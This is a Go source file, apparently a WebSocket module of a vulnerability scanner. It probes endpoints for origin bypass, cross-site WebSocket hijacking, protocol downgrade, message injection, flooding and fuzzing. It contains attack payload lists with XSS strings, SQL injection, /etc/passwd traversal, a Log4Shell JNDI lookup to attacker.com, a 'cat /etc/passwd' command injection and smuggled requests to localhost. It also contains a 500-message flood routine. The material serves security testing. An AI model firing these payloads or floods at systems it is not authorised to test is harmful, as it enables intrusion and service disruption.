package websocket

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
	"github.com/gorilla/websocket"
)

type WebSocketModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *WebSocketModule) ID() string   { return "websocket" }
func (m *WebSocketModule) Name() string { return "WebSocket & Real-Time Protocol Module" }
func (m *WebSocketModule) Description() string {
	return "WS-hijack, CSWSH, origin bypass, protocol downgrade, message injection, DoS, real-time fuzzing"
}
func (m *WebSocketModule) Severity() models.Severity { return models.Critical }

var wsEndpoints = []string{
	"/ws", "/wss", "/websocket", "/socket", "/socket.io",
	"/chat", "/stream", "/events", "/realtime", "/live",
	"/api/ws", "/api/v1/ws", "/v1/ws", "/ws/v1",
	"/notifications", "/push", "/subscribe", "/pubsub",
}

var fuzzPayloads = []string{
	"<script>alert(1)</script>",
	"' OR '1'='1",
	"../etc/passwd",
	"${jndi:ldap://attacker.com/a}",
	"__proto__[pollution]=true",
	"{\"__proto__\":{\"admin\":true}}",
	"<![CDATA[<script>]]>",
	"\x00\x01\x02\x03\x04",
	strings.Repeat("A", 10000),
}

type wsResult struct {
	endpoint string
	scheme   string
	err      error
	status   string
}

func (m *WebSocketModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *WebSocketModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	u, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}

	scheme := "ws"
	if u.Scheme == "https" {
		scheme = "wss"
	}

	results := m.discoverEndpoints(ctx, u, scheme)

	for _, r := range results {
		if r.err != nil {
			continue
		}

		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		findings = append(findings, m.testHijack(ctx, r.endpoint)...)
		findings = append(findings, m.testOriginBypass(ctx, r.endpoint, u)...)
		findings = append(findings, m.testCSWSH(ctx, r.endpoint, u)...)
		findings = append(findings, m.testDowngrade(ctx, r.endpoint, u.Scheme)...)
		findings = append(findings, m.testMessageInjection(ctx, r.endpoint)...)
		findings = append(findings, m.testFlood(ctx, r.endpoint)...)
		findings = append(findings, m.testFuzzing(ctx, r.endpoint)...)
	}

	return findings, nil
}

func (m *WebSocketModule) discoverEndpoints(ctx context.Context, u *url.URL, scheme string) []wsResult {
	var results []wsResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	baseHost := u.Host
	for _, ep := range wsEndpoints {
		wg.Add(1)
		go func(endpoint string) {
			defer wg.Done()
			wsURL := fmt.Sprintf("%s://%s%s", scheme, baseHost, endpoint)
			dialer := &websocket.Dialer{
				HandshakeTimeout: 5 * time.Second,
				TLSClientConfig:  &tls.Config{InsecureSkipVerify: false},
			}
			conn, _, err := dialer.DialContext(ctx, wsURL, nil)
			r := wsResult{endpoint: wsURL, scheme: scheme}
			if err != nil {
				r.err = err
			} else {
				r.status = "connected"
				conn.Close()
			}
			mu.Lock()
			results = append(results, r)
			mu.Unlock()
		}(ep)
	}
	wg.Wait()
	return results
}

func (m *WebSocketModule) dial(endpoint string) (*websocket.Conn, *http.Response, error) {
	dialer := &websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
	}
	return dialer.Dial(endpoint, nil)
}

func (m *WebSocketModule) dialWithOrigin(endpoint, origin string) (*websocket.Conn, *http.Response, error) {
	h := http.Header{}
	if origin != "" {
		h.Set("Origin", origin)
	}
	dialer := &websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
	}
	return dialer.Dial(endpoint, h)
}

func (m *WebSocketModule) testHijack(ctx context.Context, endpoint string) []*models.Finding {
	var findings []*models.Finding

	conn, resp, err := m.dial(endpoint)
	if err != nil {
		return nil
	}
	defer conn.Close()

	if resp != nil {
		originCheck := resp.Header.Get("Access-Control-Allow-Origin")

		if originCheck == "" || originCheck == "*" {
			findings = append(findings, &models.Finding{
				Title:       "WebSocket - Handshake Hijacking (WS-Hijack)",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         endpoint,
				Evidence:    fmt.Sprintf("WebSocket connection established. Origin validation: %s", originCheck),
				Description: "WebSocket endpoint accepted connection without proper Origin validation, enabling handshake hijacking.",
				Remediation: "Validate Origin header on WebSocket upgrade requests. Use CSRF tokens in the upgrade handshake.",
				CWEID:       "CWE-1385",
				ModuleID:    "websocket",
			})
		}

	}

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, msg, err := conn.ReadMessage()
	if err == nil {
		findings = append(findings, &models.Finding{
			Title:       "WebSocket - Immediate Data Exposure",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         endpoint,
			Evidence:    fmt.Sprintf("Received data immediately after connect: %s", string(msg)),
			Description: "WebSocket endpoint sends data immediately upon connection without authentication, potentially leaking sensitive information.",
			Remediation: "Require authentication before sending data over WebSocket connections.",
			CWEID:       "CWE-200",
			ModuleID:    "websocket",
		})
	}

	return findings
}

func (m *WebSocketModule) testOriginBypass(ctx context.Context, endpoint string, u *url.URL) []*models.Finding {
	var findings []*models.Finding

	maliciousOrigins := []string{
		"https://evil.com",
		"https://attacker.com",
		"null",
		"http://localhost",
		"https://localhost:8080",
		"http://127.0.0.1",
		"https://evil.com:443",
		"http://evil.com:8080",
		"https://192.168.1.1",
		"",
	}

	tested := false
	for _, origin := range maliciousOrigins {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		conn, _, err := m.dialWithOrigin(endpoint, origin)
		if err != nil {
			continue
		}
		conn.Close()

		tested = true
		if origin != "" {
			findings = append(findings, &models.Finding{
				Title:       "WebSocket - Origin Bypass",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         endpoint,
				Evidence:    fmt.Sprintf("Connection succeeded with malicious Origin: %s", origin),
				Description: "WebSocket endpoint accepted connection from unauthorized Origin, allowing cross-origin WebSocket attacks.",
				Remediation: "Validate Origin header against allowlist. Implement CSRF tokens for WebSocket connections.",
				CWEID:       "CWE-942",
				ModuleID:    "websocket",
			})
			break
		}
	}

	if !tested {
		conn, _, err := m.dial(endpoint)
		if err == nil {
			conn.Close()
			findings = append(findings, &models.Finding{
				Title:       "WebSocket - Origin Validation Missing",
				Severity:    models.High,
				Confidence:  models.LowConfidence,
				URL:         endpoint,
				Evidence:    "WebSocket connection succeeded without Origin header validation",
				Description: "WebSocket endpoint accepts connections without validating Origin header, enabling CSWSH attacks.",
				Remediation: "Implement strict Origin header validation for all WebSocket connections.",
				CWEID:       "CWE-346",
				ModuleID:    "websocket",
			})
		}
	}

	return findings
}

func (m *WebSocketModule) testCSWSH(ctx context.Context, endpoint string, u *url.URL) []*models.Finding {
	var findings []*models.Finding

	conn, _, err := m.dial(endpoint)
	if err != nil {
		return nil
	}
	defer conn.Close()

	err = conn.WriteMessage(websocket.TextMessage, []byte("ping"))
	if err != nil {
		return nil
	}

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, msg, err := conn.ReadMessage()
	if err != nil {
		return nil
	}

	responseStr := string(msg)
	if len(responseStr) > 0 {
		findings = append(findings, &models.Finding{
			Title:       "WebSocket - Cross-Site WebSocket Hijacking (CSWSH)",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         endpoint,
			Evidence:    fmt.Sprintf("WebSocket responds to messages without authentication. Response: %s", truncateString(responseStr, 200)),
			Description: "WebSocket endpoint is vulnerable to Cross-Site WebSocket Hijacking. Attacker can read/write messages cross-origin via browser.",
			Remediation: "Validate Origin header. Use CSRF tokens. Authenticate WebSocket connections. Use SameSite cookies.",
			CWEID:       "CWE-1385",
			ModuleID:    "websocket",
		})
	}

	return findings
}

func (m *WebSocketModule) testDowngrade(ctx context.Context, endpoint string, origScheme string) []*models.Finding {
	var findings []*models.Finding

	if origScheme == "https" {
		wsEndpoint := strings.Replace(endpoint, "wss://", "ws://", 1)
		if wsEndpoint == endpoint {
			return nil
		}

		conn, _, err := m.dial(wsEndpoint)
		if err == nil {
			conn.Close()
			findings = append(findings, &models.Finding{
				Title:       "WebSocket - Protocol Downgrade (wss:// to ws://)",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         endpoint,
				Evidence:    fmt.Sprintf("WSS endpoint also accessible via unencrypted WS: %s", wsEndpoint),
				Description: "WebSocket Secure (wss://) endpoint also accepts unencrypted connections (ws://), allowing MITM attacks and data interception.",
				Remediation: "Disable unencrypted WebSocket connections. Redirect ws:// to wss://. Implement HSTS and CSP headers.",
				CWEID:       "CWE-319",
				ModuleID:    "websocket",
			})
		}

		conn2, _, err2 := m.dial(endpoint)
		if err2 != nil {
			findings = append(findings, &models.Finding{
				Title:       "WebSocket - wss:// Connection Failure",
				Severity:    models.Medium,
				Confidence:  models.LowConfidence,
				URL:         endpoint,
				Evidence:    fmt.Sprintf("WSS connection failed: %v", err2),
				Description: "WebSocket over TLS failed to connect, which may indicate a protocol downgrade opportunity.",
				Remediation: "Ensure WSS is properly configured with valid TLS certificates.",
				CWEID:       "CWE-319",
				ModuleID:    "websocket",
			})
		} else {
			conn2.Close()
		}
	}

	return findings
}

func (m *WebSocketModule) testMessageInjection(ctx context.Context, endpoint string) []*models.Finding {
	var findings []*models.Finding

	injectionPayloads := []string{
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"{\"cmd\":\"exec\",\"args\":[\"cat /etc/passwd\"]}",
		"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
		"CONNECT 127.0.0.1:6379 HTTP/1.1\r\n\r\n",
	}

	for _, payload := range injectionPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		conn, _, err := m.dial(endpoint)
		if err != nil {
			continue
		}

		err = conn.WriteMessage(websocket.TextMessage, []byte(payload))
		if err != nil {
			conn.Close()
			continue
		}

		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		_, msg, err := conn.ReadMessage()
		if err == nil {
			responseStr := string(msg)
			lowResp := strings.ToLower(responseStr)
			for _, pat := range []string{"error", "exception", "warning", "stack", "trace", "syntax"} {
				if strings.Contains(lowResp, pat) {
					findings = append(findings, &models.Finding{
						Title:       "WebSocket - Message Injection / Poisoning",
						Severity:    models.Critical,
						Confidence:  models.MediumConfidence,
						URL:         endpoint,
						Payload:     truncateString(payload, 200),
						Evidence:    fmt.Sprintf("Server error response to injected message: %s", truncateString(responseStr, 200)),
						Description: "WebSocket endpoint returned error indicating message injection is possible. Attacker can poison WebSocket state.",
						Remediation: "Validate and sanitize all WebSocket messages. Implement input validation and output encoding.",
						CWEID:       "CWE-79",
						ModuleID:    "websocket",
					})
					break
				}
			}
		}
		conn.Close()
	}

	return findings
}

func (m *WebSocketModule) testFlood(ctx context.Context, endpoint string) []*models.Finding {
	var findings []*models.Finding

	conn, _, err := m.dial(endpoint)
	if err != nil {
		return nil
	}
	defer conn.Close()

	floodCount := 500
	floodStart := time.Now()
	var floodWg sync.WaitGroup
	floodErrors := 0
	var floodMu sync.Mutex

	for i := 0; i < floodCount; i++ {
		floodWg.Add(1)
		go func(idx int) {
			defer floodWg.Done()
			err := conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("flood-%d", idx)))
			if err != nil {
				floodMu.Lock()
				floodErrors++
				floodMu.Unlock()
			}
		}(i)
	}
	floodWg.Wait()
	floodDuration := time.Since(floodStart)

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, _, _ = conn.ReadMessage()

	if floodErrors == 0 && floodDuration < 2*time.Second {
		findings = append(findings, &models.Finding{
			Title:       "WebSocket - DoS via Message Flooding",
			Severity:    models.High,
			Confidence:  models.MediumConfidence,
			URL:         endpoint,
			Evidence:    fmt.Sprintf("Sent %d messages in %v with %d errors", floodCount, floodDuration, floodErrors),
			Description: "WebSocket endpoint accepted high volume of messages without rate limiting, enabling DoS via message flooding.",
			Remediation: "Implement WebSocket message rate limiting. Set maximum messages per second. Use backpressure mechanisms.",
			CWEID:       "CWE-400",
			ModuleID:    "websocket",
		})
	}

	return findings
}

func (m *WebSocketModule) testFuzzing(ctx context.Context, endpoint string) []*models.Finding {
	var findings []*models.Finding

	for _, fuzz := range fuzzPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		conn, _, err := m.dial(endpoint)
		if err != nil {
			continue
		}

		writeTypes := []int{websocket.TextMessage, websocket.BinaryMessage}
		for _, wType := range writeTypes {
			err := conn.WriteMessage(wType, []byte(fuzz))
			if err != nil {
				conn.Close()
				break
			}
		}

		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		_, msg, err := conn.ReadMessage()
		if err == nil {
			responseStr := string(msg)
			if strings.Contains(strings.ToLower(responseStr), "error") ||
				strings.Contains(strings.ToLower(responseStr), "exception") {
				findings = append(findings, &models.Finding{
					Title:       "Real-Time Protocol - Fuzzing Vulnerability",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         endpoint,
					Payload:     truncateString(fuzz, 200),
					Evidence:    fmt.Sprintf("Fuzz payload triggered error: %s", truncateString(responseStr, 200)),
					Description: "WebSocket real-time protocol fuzzing detected error responses, indicating potential parsing vulnerabilities.",
					Remediation: "Implement strict input validation. Use safe parsers. Apply defense-in-depth for all message handlers.",
					CWEID:       "CWE-20",
					ModuleID:    "websocket",
				})
				break
			}
		}
		conn.Close()
	}

	return findings
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func init() {
	engine.GetRegistry().Register(&WebSocketModule{})
}
